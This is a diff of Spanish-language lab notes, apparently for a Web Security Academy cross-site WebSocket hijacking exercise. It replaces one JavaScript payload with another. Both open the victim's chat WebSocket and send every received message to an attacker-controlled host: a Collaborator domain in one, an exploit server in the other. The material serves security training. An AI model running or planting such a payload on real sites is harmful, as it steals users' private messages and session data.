@@ -51,11 +51,21 @@ no necesitamos el atributo `chatForm.getAttribute("action")` ya que este será l
 
 ```python
 <script> 
-	var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat'); 
-	ws.onopen = function() { 
-		ws.send("READY"); 
-	}; 
-	ws.onmessage = function(event) {
-		fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data}); }; 
+var newWebSocket = new WebSocket(
+"wss://0a8d00d8044c76f98091034900f9004e.web-security-academy.net/chat"
+);
+
+newWebSocket.onopen = function (evt) {
+	newWebSocket.send("READY");
+};
+
+newWebSocket.onmessage = function (evt) {
+	var message = evt.data;
+	fetch(
+	"https://exploit-0a130040047576bc80e70294011400d5.exploit-server.net/exploit?messge=" + btoa(message)
+	);
+}; 
 </script>
 ```
+
+
